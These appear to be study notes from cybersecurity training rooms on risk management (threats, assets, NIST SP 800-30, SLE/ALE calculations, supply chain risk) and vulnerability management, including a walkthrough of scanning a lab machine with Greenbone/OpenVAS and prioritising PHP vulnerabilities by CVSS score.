- **Threat**: an intentional or accidental event that can compromise the security of an information system. Examples include
hacking, phishing attacks, human error, and natural disasters.
- **Vulnerability**: a software, hardware, or network weakness that cybercriminals can exploit to gain unauthorised access or compromise a system.
- **Asset**: a valuable resource or component (tangible or intangible) that an organisation relies upon to achieve its objectives.
- **Risk**: the probability of a threat source exploiting an existing *vulnerability* and resulting in adverse business effects.
- **Risk Management** (RM): the process of identifying, assessing, and mitigating risk to maintain acceptable levels.

Threat

A **threat** is a *potential harm or danger* to 
an individual, organisation, or system. Threats can be classified into 
three main categories: human-made, technical, or natural.

**Human-made threats**: These threats are caused by human activities or interventions. Examples include:

- Terrorism
- Wars and conflicts
- Riots and civil unrest
- Cyberattacks
- Industrial accidents
- Arson

As can be seen, human-made threats are not limited to cyberattacks; 
although they do not require technical expertise, arson is a grave 
threat. Realising any of these threats can have the power to disrupt the
 whole business; both a cyberattack and arson can prevent a company from
 functioning for a while.

**Technical threats**: These threats result from technological failures, malfunctions, or vulnerabilities. Examples include:

- Power outages
- Software and hardware failures
- Data breaches
- Network and system vulnerabilities
- Equipment malfunctions

A power outage can halt an entire company without a backup power 
source. A failed power supply means the whole server is down unless 
another backup power supply is on standby. Any of these technical 
threats can prevent business processes from moving forward; therefore, 
considering each of these threats is a must in any risk analysis.

**Natural threats**: These are threats caused by natural events or phenomena. Examples include:

- Earthquakes
- Floods

Natural threats depend on the location of the company or data centre.
 Studying the natural hazards to which a particular area is exposed is 
necessary to ensure proper risk analysis.

## Vulnerability

A **vulnerability** is a weakness in the system or software that can be exploited by a threat to cause harm. To elaborate, it is a *weakness*
 that can be exploited by malicious individuals, groups, or external 
factors to gain unauthorised access, cause damage, or compromise the 
integrity, availability, or confidentiality of a system, data, or 
network. Vulnerabilities can arise from software bugs, 
misconfigurations, or outdated security.

## Asset

An asset is an economic resource owned or controlled by an 
individual, company, or government. It typically has the potential to 
provide some future benefit. Assets include cash and cash equivalents, 
accounts receivable, investments, stock, equipment, real estate, and 
intellectual property.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2a349759d64b49691eb9d8269a6d4f57.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2a349759d64b49691eb9d8269a6d4f57.png)

In the context of information systems, an asset in information 
systems refers to any valuable resource or component (tangible or 
intangible) that an organisation relies upon to achieve its objectives. 
These assets are critical for successfully operating and managing the 
organisation’s information processes.

Some examples of assets in an information system include:

- **Hardware**: Servers, workstations, routers, switches,
firewalls, and other physical devices used to store, process, and
transmit information.
- **Software**: Operating systems, applications, databases, and
other programs that enable the organisation to perform its functions
efficiently and effectively.
- **Data**: Organisational data, which includes sensitive
information such as customer records, financial data, intellectual
property, and personal data of employees.
- **Documentation**: Manuals, policy documents.

## Risk

Risk is the probability of a *threat source* exploiting an existing *vulnerability* (in an *asset*) and resulting in adverse business effects.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0ff6c51f52ae4b6f75a8f64f67f5f7f3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0ff6c51f52ae4b6f75a8f64f67f5f7f3.png)

Risk is the potential of encountering unforeseen events or 
circumstances that may lead to a loss, damage, or negative outcome. It 
is the possibility of an undesirable consequence from an uncertain 
situation, and it can be present in various aspects of life, such as 
finance, health, and personal relationships. In a business context, it 
is the probability of a *threat source* exploiting an existing *vulnerability*
 and resulting in adverse business effects. Since the existence of 
assets is taken for granted, some references omit assets from the visual
 representation.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/4f6d21c6b1bcc5041a36facd075940f5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/4f6d21c6b1bcc5041a36facd075940f5.png)

In information systems, risk refers to the potential threats, 
vulnerabilities, and negative consequences arising from the interaction 
between IT infrastructure, software applications, data, and users. It 
deals with the uncertainties organisations face in ensuring their 
digital assets’ confidentiality, integrity, and availability.

## Risk Management

As mentioned earlier, risk management is a process of identifying, 
assessing, and responding to risks associated with a particular 
situation or activity. It involves identifying potential risks, 
assessing their likelihood and impact, evaluating possible solutions, 
and implementing the chosen solutions to limit or mitigate risk. It also
 involves monitoring and assessing the effectiveness of the solutions 
put in place.

A Risk Management Policy is a set of procedures and processes 
designed to minimise the chances of an adverse event or outcome for an 
organisation. It helps organisations identify, assess, and manage 
potential and actual risks related to their operations, financial 
activities, and compliance with applicable laws and regulations. The 
policy provides guidance on identifying and assessing risks, as well as 
assigning tasks and responsibilities to those involved in managing them.

**Information Systems Risk Management** is a system of 
policies, procedures, and practices that seek to protect a company’s 
computer system from various internal and external threats. It includes 
identifying threats, assessing the probability of their occurrence, and 
evaluating the effectiveness of various measures that can be taken to 
limit the damage they could cause. The process also involves determining
 the resources that should be allocated to respond to potential threats,
 as well as monitoring and maintaining the integrity of the system.

**Risk Assessment Methodologies**

There are several frameworks for risk assessment. Example methodologies are:

- **NIST SP 800-30**: A risk assessment methodology developed by the National Institute of Standards and Technology (NIST). It involves identifying and evaluating risks, determining the
likelihood and impact of each risk, and developing a risk response plan.
- **Facilitated Risk Analysis Process (FRAP)**: A risk
assessment methodology that involves a group of stakeholders working
together to identify and evaluate risks. It is designed to be a more
collaborative and inclusive approach to risk analysis.
- **Operationally Critical Threat, Asset, and Vulnerability Evaluation (OCTAVE)**: A risk assessment methodology that focuses on identifying and
prioritising assets based on their criticality to the organisation’s
mission and assessing the threats and vulnerabilities that could impact
those assets.
- **Failure Modes and Effect Analysis (FMEA)**: A risk
assessment methodology commonly used in engineering and manufacturing.
It involves identifying potential failure modes for a system or process
and then analysing the possible effects of those failures and the
likelihood of their occurrence.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5779b44e8172cc546ec17f4d84577d60.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5779b44e8172cc546ec17f4d84577d60.png)

Based on NIST SP 800-30, the risk management process entails four steps:

1. **Frame risk**: First, we must establish the context within which all risk activities occur.
2. **Assess risk**: We must identify, analyse, and evaluate
potential risks and their likelihood and impact. This step is crucial to help decide on a proper response later.
3. **Respond to risk**: We need to take the steps necessary to
mitigate the likelihood or impact of the risk. The response depends on
many factors, and we will cover them separately.
4. **Monitor risk**: Finally, we continue tracking and evaluating
the effectiveness of risk responses, identifying new risks, and ensuring that our risk management activities are effective. Monitoring is an
ongoing process, as many criteria might change over time.

**Frame Risk**

Risk management begins 
with establishing a risk context, i.e., framing risk. The purpose of 
risk framing is to develop a risk management strategy.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/29cd758981cf13574b746f886ce686e4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/29cd758981cf13574b746f886ce686e4.png)

Organisations must define a risk frame to set the groundwork for 
managing risk and provide limits to risk-based decisions. To create a 
reasonable risk frame, organisations must identify the following:

- **Risk Assumptions**: What are the assumptions about threats and
vulnerabilities? What is the likelihood of occurrence? What would be the impact and consequences?
- **Risk Constraints**: What are the constraints on assessing, responding, and monitoring risks?
- **Risk Tolerance**: What are the acceptable levels of risk? What is the acceptable degree of risk uncertainty?
- **Priorities and Trade-offs**: What are the high-priority business functions? What are the trade-offs among the different types of faced risks?

## Example Scenario

Consider the case where you are part of the risk management team for 
an accounting company, and let’s revisit the above questions. We will 
avoid discussing risks and threats common to every company using 
information systems. In this example, we will only focus on one risk: 
data theft.

- **Risk Assumptions**: The fact that this company
handles the accounting data of its clients increases the risk of being
targeted by adversaries that would try to profit from stealing such
data. Unless proper measures are taken, the likelihood of success is
relatively high, and the impact would be disastrous for the company’s
image.
- **Risk Constraints**: The primary constraints are
expected to be budget-related. Safeguarding the data requires improving
physical and cyber security; it entails conducting cyber security
training and hiring new personnel.
- **Risk Tolerance**: Considering the type of business,
the risk of data theft cannot be tolerated. Tolerating data theft would
lead to the whole company going out of business.
- **Priorities and Trade-offs**: The priority is to maintain a trustworthy image of a company that can conduct its business with confidentiality and integrity.

**Assess Risk**

Risk assessment is the second part of risk management, which involves examining risks within the organisation’s risk framework.

The goal of the risk assessment is to determine the following:

- **Threats**: What are the threats that you need to consider?
- **Vulnerabilities**: What are the vulnerabilities that you have to deal with?
- **Impact**: What would be the impact if a threat exploited a vulnerability?
- **Likelihood**: What is the likelihood of this vulnerability being exploited?

## Threats

Various risk types exist because threats range from human beings to 
natural causes. We have already listed the types of threats in Task 2. 
In the following two examples, we will consider the following two 
threats:

- **Physical damage**: From natural causes to human-made, accidents happen. Examples include water leakage, fire, and power loss.
- **Outsider threat**: There are always adversaries interested in
your systems; even if your data is only valuable to you, they can still
try to infect your system with ransomware.

## Example 1

Let’s consider the following example for assessing one natural 
threat, a tsunami. The company’s main office is at ground level and 
overlooks the beach. That would make it vulnerable to tsunamis that can 
literally wash every single piece of equipment and paper inside the 
office. However, the country has never experienced tsunamis in its 
entire written history, and geologists state that the probability of a 
tsunami happening is negligible. In this scenario, we have:

- **Threat**: Tsunami
- **Vulnerability**: The office is near the seashore
- **Impact**: Destruction of office equipment
- **Likelihood**: Negligible

## Example 2

One academic institution offers quality education for its students 
via its undergraduate and graduate programs. Although the faculty and 
their students conduct research, they are of purely academic worth and 
cannot be monetised. In other words, no entity would be interested in 
stealing their research. Does this make them safe? Not really. With the 
spread of ransomware groups, a threat actor would encrypt their data 
servers and try to blackmail them into paying. The impact of such an 
attack would force the university to close for a few hours or days till 
all data is recovered from the backup, assuming it exists. The 
likelihood of being targeted is high, especially since this university 
is prestigious and well-known.

- **Threat**: Ransomware Groups
- **Vulnerability**: Data is stored on computer systems
- **Impact**: Disrupting the work of faculty and staff (till the data is recovered from backup)
- **Likelihood**: High

**Risk Analysis**

We have two approaches when it comes to risk analysis:

- **Qualitative Risk Analysis**, where we assign ratings
to risks. The ratings can be a qualitative adjective, such as high,
medium, and low. Alternatively, it can be something symbolic, such as
red, yellow, and green.
- **Quantitative Risk Analysis**, where we assign monetary values and use that as a basis for decision-making.

## Qualitative Risk Analysis

As the name suggests, qualitative risk analysis uses qualitative adjectives to describe:

- Probability of a risk-taking place, i.e., probability of a threat exploiting a vulnerability
- Impact of the risk, if realised, which can range between trivial to extreme

The figure below shows a table matching impact with probability. We 
would allocate fewer resources to respond to a risk that is unlikely to 
occur and has a trivial effect; however, it is the opposite case if the 
risk is likely to occur and has a significant impact. The former case is
 a low risk, while the latter is a high risk. Consequently, the response
 is decided accordingly.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c2cab5ae8c38c4c5b827374692534b35.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c2cab5ae8c38c4c5b827374692534b35.png)

## Quantitative Risk Analysis

### Single Loss Expectancy

Using quantitative analysis, we need to assign monetary values and numeric percentages. Let’s start with the following equation:

***SLE* = *AssetValue* × *EF***

Where:

- **Single Loss Expectancy (SLE)** is the loss incurred due to the realisation of a threat represented as a monetary value.
- **Asset Value** is the monetary valuation of an asset
- **Exposure Factor (EF)** is the percentage of loss a realised threat can cause to an asset.

### SLE Numeric Example

Consider the following numeric example for a work laptop considering the threat of a ransomware virus.

- Asset Value = $10,000; the laptop is worth $1000, and the data are worth $9000.
- EF = 90%; a ransomware infection would cause all the data to be unusable.

Consequently,

*SLE* = *AssetValue* × *EF* = $10, 000 × 90% = $9, 000.

In other words, a ransomware infection for such a work laptop would 
cause the company to lose $9000, assuming there is no backup copy.

### Annualised Loss Expectancy

However, this information is insufficient for us to decide on countermeasures. We need to find the expected loss per year.

***ALE* = *SLE* × *ARO***

Where:

- **Annualised Loss Expectancy (ALE)** is the loss the company expects to lose per year due to the threat.
- **Annualised Rate of Occurrence (ARO)** is the expected number of times this threat is realised yearly, i.e., frequency per year.

Why do we need to calculate ALE? ALE helps us decide whether paying 
for a particular control or safeguard is justified, as we will see in 
Task 7.

### ALE Numeric Example

Let’s revisit our example and calculate the ALE.

- We have already calculated the SLE as $9000; we need to figure out how often we expect this incident to happen yearly.
- Based on experience, a work computer is infected with ransomware
once every two years. Hence, the annualised rate of occurrence is 0.5.

Consequently,

*ALE* = *SLE* × *ARO* = $9000 × 0.5 = $4, 500.

In simple terms, we expect the ransomware threat to cost us **$4500 per laptop per year** unless we take proper measures.

**Respond to Risk**

Risk
 management’s third component focuses on how organisations respond to 
the risks identified through risk assessment. What are the possible 
responses to risks?

- Avoid Risk
- Transfer Risk (or Share Risk)
- Mitigate Risk (or Reduce Risk)
- Accept Risk

The response you choose against the risk takes into account the 
severity of the threat, the probability of occurrence, and the costs of 
the possible countermeasures. Let’s cover each in more detail.

- **Avoid Risk**: If a company decides to eliminate the
activity that leads to the risk, that would be risk avoidance. A bank
might decide that all employees’ computers cannot access the Internet to protect its systems against all online threats. An organisation might
instruct its employees to work exclusively using the workstations on its premises to prevent data from being stolen.
- **Transfer Risk**: A company might consider the risk
too high to handle, so it decides to purchase insurance. That would be
risk transference or risk sharing. A publishing house might buy
insurance against fire, for instance.
- **Mitigate Risk**: A company might invest in
countermeasures to reduce risk to an acceptable level; this would be
risk mitigation. To protect against computer viruses, a company might
install antivirus on all its computers instead of blocking access to the Internet and glueing the USB ports.
- **Accept Risk**: Sometimes, the countermeasure cost exceeds the loss incurred if the risk is realised.

It is important to stress that “Ignore Risk” is not a valid choice. 
Accepting a risk does not mean the risk is ignored. It means the risk is
 analysed along with its impact and countermeasures; however, some 
reasons justify keeping things unchanged. One reason might be that the 
countermeasure is too expensive compared to the potential loss. Another 
reason might be that implementing a countermeasure would significantly 
alter the business process.

## Quantitative Analysis

Quantitative risk analysis would help us decide whether a specific 
control is justified from the business perspective. Implementing a 
safeguard won’t make sense unless its benefit outweighs its cost.

Consider again our example of the risk of a laptop getting infected 
by ransomware. Can we mitigate this risk? We are considering setting up 
antivirus software on all laptops. The cost is $120 per laptop annually,
 including the licensing and extra staff hours.

We need to decide whether this countermeasure is justified from the 
business perspective. To do that, we need to calculate the value of the 
safeguard. **It would be justified from the business perspective only if the value of the safeguard is positive.** The value of the safeguard to the organisation is calculated as follows:

***ValueofSafeguard* = *ALEbeforeSafeguard* − *ALEafterSafeguard* − *AnnualCostSafeguard***

We have already calculated ALE before the safeguard is implemented.

*ALEbeforeSafeguard* = *SLEbeforeSafeguard* × *ARObeforeSafeguard* = $9000 × 0.5 = $4, 500.

Let’s calculate ALE after the safeguard is added:

*ALEafterSafeguard* = *SLEafterSafeguard* × *AROafterSafeguard*

We might need to recalculate SLE in case the implemented safeguard affected the exposure factor (EF):

*SLEafterSafeguard* = *AssetValue* × *EFafterSafeguard*

In this case, the exposure factor (EF) is not expected to change. In 
other words, installing an antivirus won’t change the damage that a 
ransomware infection would cause. Consequently, SLE remains the same 
after the safeguard is implemented:

*SLEafterSafeguard* = *AssetValue* × *EFafterSafeguard* = $10, 000 × 90% = $9, 000.

However, an antivirus would significantly decrease the annualised 
rate of occurrence (ARO). Let’s say that this antivirus is so efficient 
that we expect that ARO to become 0.02.

Now we can calculate ALE after the safeguard is added.

*ALEafterSafeguard* = *SLEafterSafeguard* × *AROafterSafeguard* = $9, 000 × 0.02 = $180.

We already estimated the safeguard cost to be $120 per year. Therefore,

*ValueofSafeguard* = $4, 500 − $180 − $120 = $4, 200.

Because the value of the selected safeguard is positive, we conclude 
that it is justified from the business perspective. In other words, from
 the risk analysis perspective, installing an antivirus has a value 
(benefit) of $4,200 to the organisation.

If the value of the safeguard turns out to be negative, it means that
 the cost of the safeguard outweighs its benefits. Consequently, it 
won’t be justified from a business perspective.

**Monitor Risk**

We have assessed the 
risk and responded with a proper measure; what’s next? We need to keep 
monitoring risks. Many reasons dictate that we continue to monitor risk,
 even after an appropriate response has been implemented. The reasons 
include the following:

- Finding and adding new risks
- Eliminating risks that are no longer relevant
- Assessing our responses to existing risks

For the latter, monitoring risks activities requires a focus on the following areas:

- Effectiveness
- Change
- Compliance

## Effectiveness Monitoring

Responding to an assessed risk does not mark the end of the story. A 
solution might be effective now but might become ineffective in the 
future.

Consider the following example: there is always a risk that employees
 might use weak passwords, which would threaten the whole network. 
Specific password complexity requirements are enforced to mitigate this 
risk. This solution should work excellently, shouldn’t it? However, 
while monitoring the effectiveness of this measure, you might discover 
that many employees are resorting to writing their complex passwords on 
sticky notes. Such discovery shows that the implemented control, i.e., 
password complexity, has become ineffective.

Without effectiveness monitoring, there is no way to discover whether
 a control is still effective and whether a risk is still mitigated 
correctly.

## Monitoring Change

“Change is the only constant in life.” as Heraclitus, a Greek 
philosopher, is quoted as saying. When it comes to risk monitoring, 
changes might be due to one of the following:

- Change in business
- Change in information systems

Business change might include opening new branches, creating new 
positions, and acquiring other companies. Any business change might 
introduce new risks and render existing controls invalid.

The more noticeable change is the change in information systems. 
Adding new equipment or migrating to new systems would introduce new 
risks. Consequently, monitoring such changes is necessary to assess 
unknown risks that have arisen.

## Compliance Monitoring

New laws might see light, new regulatory requirements might come into
 effect, and new policies might be enforced. Although the pace of change
 is not as fast as in other areas, these are still areas that the risk 
management team need to keep an eye on and monitor.

Another aspect that needs to be monitored is the audit findings. 
Failing to address audit findings can result in fines or stir legal 
action.

**Supply Chain Risk Management**

A supply chain is a 
sequence of suppliers that lead to the delivery of a product. In 
information systems, the product can be hardware, software, or service. 
Consequently, the risk is as follows:

- **Risk associated with hardware**: Depending on the importance of the target, a threat actor can add a hardware Trojan to an electronic
device. As with software Trojans, the purpose is to provide unauthorised functionality.
- **Risk associated with software**: Software Trojans require
access to the software to plant it. In the worst-case scenario, the
attacker would succeed in adding the Trojan directly to the source code.
- **Risk associated with services**: The risk can range from
downtime to data breaches. A company must ensure that the service
provider has a good security program before using its service.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0c6cb9ac7b3e2fcb15e517b1528605cc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0c6cb9ac7b3e2fcb15e517b1528605cc.png)

## Example Scenario

Consider the case of an accounting firm. They offer many services, 
such as reviewing and analysing financial statements, performing audits,
 and filing tax returns. To be able to carry out these services, example
 supplies they need include:

- Computers
- Accounting software
- Printers

They would also need some way to communicate with their clients, such
 as email. This firm bought its computers from a local shop that also 
offers maintenance. They got the accounting software from a company 
specialising in developing and customising accounting software. Finally,
 they got email service from one of the leading Internet providers. If 
we take a closer look at these three suppliers, we notice that they 
include the following:

- Hardware suppliers, such as computers
- Software suppliers, such as accounting software
- Service providers, such as email

Although this accounting firm might follow perfect measures to 
protect its assets, the risk might creep in from one of the suppliers. 
Consider the case where a threat actor succeeds at installing a 
malicious piece of code within the accounting software. Or consider the 
case where the email provider gets its servers breached and all 
confidential communications exposed.

## **VUNERABILITY MANAGEMENT**

**Introduction**

As per NIST, a [vulnerability](https://csrc.nist.gov/glossary/term/vulnerability) is defined as "*A weakness
 in an information system, system security procedures, internal 
controls, or implementation that could be exploited or triggered by a 
threat source*". In this room, we will learn the process of 
effectively identifying, detecting, mitigating, and reporting a 
vulnerability in a system in line with standard frameworks. The room 
entails a practical example through an open-source tool that will help 
us understand various vulnerability management lifecycle processes.

**Vulnerability Management vs Vulnerability Scanning**

# Vulnerability Management

Vulnerability
 management is an ongoing, proactive, and frequently automated activity 
that protects computer systems, networks, and enterprise solutions from 
cyberattacks and data breaches. Consequently, it is a vital component of
 an overall security program. By discovering, evaluating, and correcting
 potential security flaws, businesses can help avoid attacks and 
mitigate their effects if they occur.

# Vulnerability Scanning

Since
 vulnerability management is the process surrounding vulnerability 
scanning, it is essential to know how vulnerability scans are conducted 
and the tools at hand. Today, operating a vulnerability scanning tool 
requires little technical knowledge. Most vulnerability scanners may be 
operated via a graphical user interface, allowing a user to do 
vulnerability scans on a whole network with a few mouse clicks.

Security
 vendors offer various technological solutions with varying deployment 
choices, including standalone, managed services, and Software as a 
Service (SaaS). Some popular commercial vulnerability scanning tools 
include Nessus, Nexpose, and Acunetix. On the other hand, some good 
open-source solutions like Greenbone (community edition), OWASP ZAP and 
many more.

# What is the difference?

The
 terms vulnerability management and vulnerability scanning are 
frequently misunderstood. Despite their relationship, there is a 
significant distinction between the two. Utilising a computer program to
 find vulnerabilities in networks, computer infrastructure, or 
applications constitutes vulnerability scanning. However, vulnerability 
management is the process that encompasses vulnerability scanning, as 
well as other factors, including but not limited to risk acceptance, 
remediation, and reporting.

Vulnerability management aims to 
lower an organisation's overall risk exposure by promptly identifying 
and mitigating as many vulnerabilities as feasible. This can be 
challenging, given the potential vulnerabilities and limited resources 
available for remediation. Vulnerability management should be a 
continual effort to stay up with new and emerging threats.

The
 growing prevalence of cybercrime and the accompanying risks are 
compelling most firms to prioritise information security. A company's 
efforts to control information security threats should include a 
procedure for vulnerability management. This procedure will enable a 
business to receive a continual overview of the vulnerabilities and 
related hazards in its IT environment. A company can only prevent 
attackers from infiltrating their networks and stealing sensitive data 
by discovering and mitigating IT environment vulnerabilities.

**Vulnerability Classification**

While security 
vendors often prefer to develop their own vulnerability specifications, 
vulnerability management is generally viewed as an open, standards-based
 approach employing the National Institute of Standards and Technology's
 (NIST) Security Content Automation Protocol (SCAP) standard. The 
primary components of SCAP are as follows:

- **Common Vulnerabilities and Exposures (CVE):** [MITRE](https://cve.mitre.org/cve/) maintains the CVE list of publicly documented vulnerabilities and exposures. Each of the CVEs identifies a vulnerability that may be exploited to launch
an attack. With a unique identifier, a description, and at least one
public reference, CVE seeks to standardise the identification of
security vulnerabilities. Anyone can access the CVE system at no cost,
making it a valuable resource for security management professionals and
organizations. [CVE Details](https://www.cvedetails.com/) is also a renowned website for searching CVEs and their impact.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/1079a146df325c06a3bfabb74d7b4a70.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/1079a146df325c06a3bfabb74d7b4a70.png)

For example, [CVE-2021-23885](https://www.cvedetails.com/cve/CVE-2021-23885/)
 illustrates a CVE identifier consisting of the CVE prefix, the year the
 CVE ID was given, and the sequence number. Furthermore, the CVE 
description includes the affected product name, the affected versions, 
the product manufacturer, the vulnerability's nature, the overall 
impact, the access an attacker would need to exploit the vulnerability, 
and the crucial code inputs required.

- **Common Configuration Enumeration (CCE):** A CCE gives system configuration issues unique identifiers to quickly and accurately link configuration data from different information sources
and tools. For instance, CCE identifiers can be used to match up
configuration assessment tool results with recommended best practices.
This is comparable to the CVE list, which gives publicly reported system vulnerability IDs.
- **Common Platform Enumeration (CPE):** CPE is a method for classifying and identifying devices, operating systems
(OS), and application types inside an infrastructure. CPE is widely used in security and vulnerability management tools to identify various
assets and to take accurate automated decisions through correlation with CVE and CCE.
- **Common Vulnerability Scoring System (CVSS):** CVSS is a scoring system that rates the severity of vulnerabilities and
identifies their characteristics. It assigns severity scores to all
defined vulnerabilities, which is used to prioritise mitigation efforts
and the required resources based on the severity. The range of possible
scores is 0 to 10, with 10 representing the most severe.

| **CVSS(3) Score** | **Severity Rating** |
| --- | --- |
| 0 | None |
| 0.1 to 3.9 | Low |
| 4.0 to 6.9 | Medium |
| 7.0 to 8.9 | High |
| 9.0 to 10 | Critical |

There are numerous public sites with information on vulnerabilities; however, the [National Vulnerability Database](https://nvd.nist.gov/)
 (NVD) administered by NIST is a comprehensive database of CVE-assigned 
known vulnerabilities. Although NVD and CVE are frequently used 
interchangeably, they differ in many ways. CVE is just a list of all the
 entries for known vulnerabilities. Nevertheless, NVD is a more 
comprehensive database based on and fully synchronised with the CVE 
list, guaranteeing that any updates to the CVE list are represented in 
NVD. Besides the analysis of CVEs, the NVD also allocates a CVSS score 
to each vulnerability.

**Vulnerability Management Life Cycle - Discover & Prioritise**

There are six essential phases in the vulnerability management lifecycle that can be mapped out from the

[NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

;
 each includes its sub-processes and activities. These stages can be 
used by organisations wishing to develop or enhance their vulnerability 
management program. To showcase the execution process for vulnerability 
management, let's examine a real-world situation.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/cb8008edf7c00e47b9642c2008de2a86.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/cb8008edf7c00e47b9642c2008de2a86.png)

**Connecting to the Machine**

We
 will use Ubuntu as a test machine and Greenbone Community Edition (GCE)
 throughout the room. You can start the virtual machine by clicking `Start Machine`. The
 machine takes about 4 minutes to boot; additionally, please wait 1 - 2 
minutes for OpenVAS to be configured in the background.

First,
 we will see a case study and then we will practically test an Ubuntu 
machine. In the case study, we will be scanning a Windows machine 
hosting a web application using `XAMPP`; however, for the 
exercise part, we will be going through the scan report of an Ubuntu 
machine. Since this study aims to implement a vulnerability management 
system, the basic commands and the installation process are exempted. 
You can learn more about its installation in [this](https://tryhackme.com/room/openvas) room.

Using
 a practical example, let's dig deeper into various phases of 
vulnerability management. Open the web panel for the GCE by visiting the
 URL `http://10.10.140.14:9392`. The default credentials for the platform are `admin:admin`. Ignore the unencrypted connection message on the screen, as this is for demonstration purposes only.

# Step 1: Discover

The
 first step is to compile a list of all the environment's 
resources/assets, including the applications, services, operating 
systems, and configurations, to identify vulnerabilities. Typically, 
this combines both a network scan and a system scan and enables you 
against any potential threat to the organisation's information and 
critical infrastructure. For this purpose, organisation-wide scanning 
should be planned and conducted regularly.

Consider we are working
 as a Security Engineer in a cybersecurity company and have been tasked 
to perform vulnerability management of the company's assets. We can 
perform the discovery using the following steps in GCE:

**Add Target**: Once logged in to GCE, open the **Configuration** menu, and click on **Targets**. Once the page is opened, click the **page with a star** icon on the left side to ****add a new target. In the example, we will add the IP address **10.10.183.198**,
 which belongs to a Windows-based machine. We can scan all the subnets 
and networks of the company; however, for the sake of this task, we 
added only a single IP, as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8ed71476ce9d80721c467cb371711883.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8ed71476ce9d80721c467cb371711883.png)

*Click to enlarge the image.*

**Add Task:** Next, open the **Scans** menu, and click on **Tasks** to configure the tool to scan all the assets running on the specified target (**10.10.183.198**). Once the page is opened, click the **page with a star** icon on the left side to add a new task, as shown below. We can run the task by clicking the **start** button next to the respective task.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/a485ea4085f0c7eddba3837b03789f52.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/a485ea4085f0c7eddba3837b03789f52.png)

*Click to enlarge the image.*

We
 have initiated the scanning process to discover all the assets and 
vulnerabilities of the target. The status of all the scan tasks is 
available through the `Scan > Reports` menu of the tool. 
As soon as the scan is finished, we can click on the corresponding scan 
from the same page to see all identified assets and vulnerability 
details. *You can ignore the vulnerabilities related to GCE*.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/308df9224640e0de7a0a70b8f2b569d8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/308df9224640e0de7a0a70b8f2b569d8.png)

*Click to enlarge the image.*

**Step 2: Prioritise**

The
 second step involves grouping and assigning a risk-based priority to 
the assets (identified during the discovery phase) based on how crucial 
they are to the business. This can significantly assist the organisation
 in determining which groups require special attention and thus will aid
 in the decision-making process when distributing resources.

Once 
the results are identified, we will prioritise the identified 
vulnerabilities in different assets based on their operational 
importance. Asset vulnerabilities leading to data breaches and DB access are rated as **Top** risk
 priority since the breach of sensitive organisation records would 
damage the organisation's reputation and may also have legal or 
regulatory consequences.

**Vulnerability Management Life Cycle - Assess & Report**

# Step 3: Assess

The
 third phase involves creating a risk baseline by evaluating your assets
 to determine how severe each is. The process lets organisations decide 
which risks to eliminate based on factors such as their classification, 
criticality level, and vulnerability level. In the longer run, 
assessments help organisations establish a consistent baseline.

For this purpose, we looked at the **Top** risk-rated assets and noticed that most of them are associated with `PHP` (a
 server-side scripting language); therefore, we decided to look into the
 vulnerabilities of this asset first. A list of identified 
vulnerabilities filtered with `PHP` is shown below. It can be seen that a total of **173 vulnerabilities** are associated with this asset by the GVM OpenVAS scanner. Most of them are rated as **High** severity, whereas others were rated as **Medium** severity. Only two of the vulnerabilities associated with `PHP` are rated as **Low** severity.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/4a022a935caf05486ac21c0f81bcbe66.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/4a022a935caf05486ac21c0f81bcbe66.png)

*Click to enlarge the image.*

# Step 4: Reporting

The next step is to use the assessment results to determine the risk levels associated with each vulnerability. **Documenting and reporting**
 known vulnerabilities is crucial. It makes it easier for security 
engineers to monitor vulnerability dynamics throughout their networks 
and guarantees that businesses continue to adhere to all applicable 
security requirements and regulations.

For this purpose, we inspected the top **High** severity
 vulnerability with a CVSS score of 10.0. We can do this by clicking on 
the corresponding vulnerability from the GUI to get more details about 
the vulnerability and the possible impact. The following image shows 
that the GVM has provided information on the vulnerability and **suggested remedial measures to fix it**. Similarly, we inspected the "Buffer Overflow vulnerability" and several other critical vulnerabilities associated with `PHP` in the scan results and found that all of them can be fixed by upgrading the `PHP` to its latest version.

